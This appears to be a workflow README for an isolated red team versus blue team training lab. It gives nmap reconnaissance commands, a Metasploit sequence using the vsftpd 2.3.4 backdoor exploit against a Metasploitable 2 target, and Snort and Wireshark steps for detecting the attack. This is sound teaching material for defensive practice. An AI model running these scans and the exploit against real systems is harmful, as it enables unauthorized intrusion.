# Project Workflow

This document explains the step-by-step workflow of the **Red Team vs Blue Team Simulation Lab**.  
The project simulates a real cybersecurity environment where an attacker attempts to compromise a system and a defender monitors and detects the attack.

------------------------------------------------------------

## Step 1 – Lab Environment Setup

The first step is creating an isolated lab environment using virtual machines.

Machines used:

Attacker Machine → Kali Linux  
Target Machine → Metasploitable 2  

Both machines are connected using the same virtual network so they can communicate.

Goal of this step:

Create a safe environment where attacks can be performed without affecting real systems.

------------------------------------------------------------

## Step 2 – Verify Network Connectivity

Before starting any attack, the attacker checks whether the target machine is reachable.

Command used:

ping TARGET_IP

Goal of this step:

Confirm that both machines are connected and communication is possible.

------------------------------------------------------------

## Step 3 – Host Discovery

The attacker verifies if the target system is active on the network.

Command used:

nmap -sn TARGET_IP

Goal:

Detect live hosts without scanning ports.

------------------------------------------------------------

## Step 4 – Port Scanning

Next, the attacker scans the target machine to identify open ports.

Command used:

nmap -sS --open -T4 TARGET_IP

Goal:

Identify open ports that may expose vulnerable services.

Example open ports:

21 – FTP  
22 – SSH  
80 – HTTP  

------------------------------------------------------------

## Step 5 – Service Enumeration

After discovering open ports, the attacker identifies the services running on those ports.

Command used:

nmap -sS -sV TARGET_IP

Goal:

Detect service versions that might contain vulnerabilities.

------------------------------------------------------------

## Step 6 – Vulnerability Identification

The attacker performs vulnerability scanning to identify potential weaknesses.

Command used:

nmap --script vuln TARGET_IP

Goal:

Discover known vulnerabilities in running services.

------------------------------------------------------------

## Step 7 – Exploitation using Metasploit

After identifying vulnerable services, the attacker attempts exploitation.

Commands used:

msfconsole

search vsftpd

use exploit/unix/ftp/vsftpd_234_backdoor

set RHOST TARGET_IP

exploit

Goal:

Gain unauthorized access to the vulnerable target system.

------------------------------------------------------------

## Step 8 – Network Monitoring (Blue Team)

While the attack is being performed, the Blue Team monitors network traffic.

Tool used:

Snort IDS

Command used:

sudo snort -A console -i eth0 -c /etc/snort/snort.conf

Goal:

Detect suspicious activities such as port scanning or exploit attempts.

------------------------------------------------------------

## Step 9 – Packet Analysis

Network packets are captured and analyzed using Wireshark.

Command used:

sudo wireshark

Goal:

Observe how attack traffic appears on the network.

Security analysts use packet inspection to identify malicious behavior.

------------------------------------------------------------

## Step 10 – Attack Detection

The Blue Team analyzes alerts generated by Snort and captured packets in Wireshark.

Goal:

Understand how attacks are detected and monitored in real cybersecurity environments.

------------------------------------------------------------

## Final Workflow Summary

The project follows a complete cybersecurity lifecycle:

1 Lab setup  
2 Network verification  
3 Host discovery  
4 Port scanning  
5 Service enumeration  
6 Vulnerability identification  
7 Exploitation  
8 Intrusion detection  
9 Packet analysis  
10 Attack detection

This workflow demonstrates both **offensive (Red Team)** and **defensive (Blue Team)** security operations.
